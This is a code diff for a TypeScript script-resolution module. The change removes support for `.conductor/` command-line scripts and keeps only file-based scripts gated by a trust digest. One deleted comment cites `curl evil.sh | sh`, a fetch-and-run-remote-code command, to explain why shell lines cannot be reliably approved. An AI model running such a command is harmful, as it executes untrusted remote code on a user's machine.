@@ -4,9 +4,9 @@
  * Until this existed, the three scripts lived in `~/.octopus/projects/<id>/` and
  * nowhere else — one directory, on one machine. A second developer cloning the
  * same repository had to write them again, and so did the same developer on a
- * second machine. So a checkout may carry them, in `.octopus/` of its own or in
- * the `.conductor/` it already has, and **the repository wins**: a clone works
- * with nothing configured, which is the whole point.
+ * second machine. So a checkout may carry them, in a `.octopus/` of its own, and
+ * **the repository wins**: a clone works with nothing configured, which is the
+ * whole point.
  *
  * That inverts what `repo-config.md` decided, and the reason it can be inverted
  * is worth stating. The objection to a live layer was that it would be silently
@@ -30,7 +30,6 @@
 import { readFile } from 'node:fs/promises'
 import { join } from 'node:path'
 
-import { readConductorConfig } from './conductorConfig.js'
 import { INSTRUCTION_FILES, type InstructionKind } from './instructions.js'
 import { REPO_DIR, assertUnlinkedPath } from './repoConfig.js'
 import { trustDigest } from './repoTrust.js'
@@ -39,42 +38,19 @@ import { SCRIPT_FILES, type ScriptKind, readScript, scriptExists, scriptPath } f
 import type { ProjectId } from './types.js'
 
 /** Where a resolved script was found, in the order they are consulted. */
-export type ScriptSource = 'repoOctopus' | 'repoConductor' | 'project'
-
-/** How a script is started. */
-export type ScriptRun =
-  /** A file to execute. Its own executable bit applies, as it always has. */
-  | { readonly type: 'file'; readonly path: string }
-  /**
-   * A command line for the shell.
-   *
-   * Conductor's settings name commands rather than files, and a command line
-   * has to reach the shell as written — quoting `-p $CONDUCTOR_PORT` would make
-   * the whole line the name of a program.
-   */
-  | { readonly type: 'command'; readonly command: string }
+export type ScriptSource = 'repoOctopus' | 'project'
 
 export interface ResolvedScript {
   readonly kind: ScriptKind
   readonly source: ScriptSource
   /** Where it came from, as the reader would go looking for it. */
   readonly from: string
-  readonly run: ScriptRun
+  /** The file to execute. Its own executable bit applies, as it always has. */
+  readonly path: string
   /**
-   * The text that is shown before it is approved, and what is digested.
-   *
-   * The file's body, or the command line — and the difference matters, because
-   * only the first is what runs. A file's contents *are* the program, so
-   * showing every byte of them is an approval of the program. A command line is
-   * a pointer: `./scripts/boot.sh` is four characters over a file this never
-   * touches, so a `git pull` rewriting that file leaves the digest identical
-   * and the approval standing.
-   *
-   * Not fixable by following the line. `repoTrust.ts` settled the rule for
-   * hooks — do not resolve a path out of a shell line, because
-   * `curl evil.sh | sh` names no file — and there is no directory to digest
-   * whole here, so what is left is to claim no more than the digest holds. The
-   * card says so where the approval is given.
+   * The file's body: the text that is shown before it is approved, and what is
+   * digested. A file's contents *are* the program, so showing every byte of them
+   * is an approval of the program.
    */
   readonly contents: string
 }
@@ -104,16 +80,15 @@ async function octopusScript(cwd: string, kind: ScriptKind): Promise<ResolvedScr
     return null
   }
 
-  return { kind, source: 'repoOctopus', from: relative, run: { type: 'file', path }, contents }
+  return { kind, source: 'repoOctopus', from: relative, path, contents }
 }
 
 /**
  * Which script runs for one kind, and where it came from.
  *
- * `.octopus/` first because it is ours and unambiguous, `.conductor/` next
- * because a repository set up for that tool should work here unchanged, and the
+ * `.octopus/` first because it is the repository's own answer, and the
  * project's own settings last — the local answer for a checkout that carries
- * neither.
+ * none.
  *
  * `cwd` is the worktree a run would happen in, or the checkout when the
  * question is asked with no workspace open. Those can differ: a branch may add
@@ -129,25 +104,13 @@ export async function resolveScript(
   const own = await octopusScript(cwd, kind)
   if (own !== null) return own
 
-  const conductor = await readConductorConfig(cwd)
-  const named = conductor?.scripts[kind]
-  if (named !== undefined) {
-    return {
-      kind,
-      source: 'repoConductor',
-      from: named.path,
-      run: { type: 'command', command: named.command },
-      contents: named.command
-    }
-  }
-
   if (await scriptExists(kind, projectId, root)) {
     const path = scriptPath(kind, projectId, root)
     return {
       kind,
       source: 'project',
       from: path,
-      run: { type: 'file', path },
+      path,
       contents: await readScript(kind, projectId, root)
     }
   }
@@ -178,10 +141,6 @@ export async function resolveScripts(
 
 /**
  * What has to be approved before any of these may run, or `''` for nothing.
- *
- * **Exact for a file, a pointer for a command line.** See `contents` above: a
- * `.conductor` script is a line, so this digests the line and not the shell it
- * invokes. The pane says as much when one is being approved.
  *
  * **Only what the repository supplies.** A script the user wrote in Project
  * settings is not gated: they wrote it, and asking somebody to approve their own
@@ -214,7 +173,7 @@ export function octopusInstructionPath(kind: InstructionKind): string {
 
 /** One instruction a repository supplies, and which file it came from. */
 export interface RepoInstruction {
-  readonly source: 'repoOctopus' | 'repoConductor'
+  readonly source: 'repoOctopus'
   readonly from: string
   readonly body: string
 }
@@ -228,8 +187,8 @@ export interface RepoInstruction {
  * visible user message, where it is read before it does anything, and a dialog
  * in front of every one of them would be friction for no gain.
  *
- * Four of the seven have a Conductor counterpart; the rest fall through to the
- * project's own, then the installation's, then the written template.
+ * Anything it does not supply falls through to the project's own, then the
+ * installation's, then the written template.
  */
 export async function repoInstruction(
   kind: InstructionKind,
@@ -247,14 +206,5 @@ export async function repoInstruction(
     // Not carried under `.octopus/`, which is the ordinary case.
   }
 
-  const conductor = await readConductorConfig(cwd)
-  if (conductor === null) return null
-
-  const prompt = conductor.prompts[kind]
-
-  // A prompt implies the file that carried it, which is why `promptsPath` is a
-  // string rather than a nullable one.
-  return prompt === undefined
-    ? null
-    : { source: 'repoConductor', from: conductor.promptsPath, body: prompt }
+  return null
 }
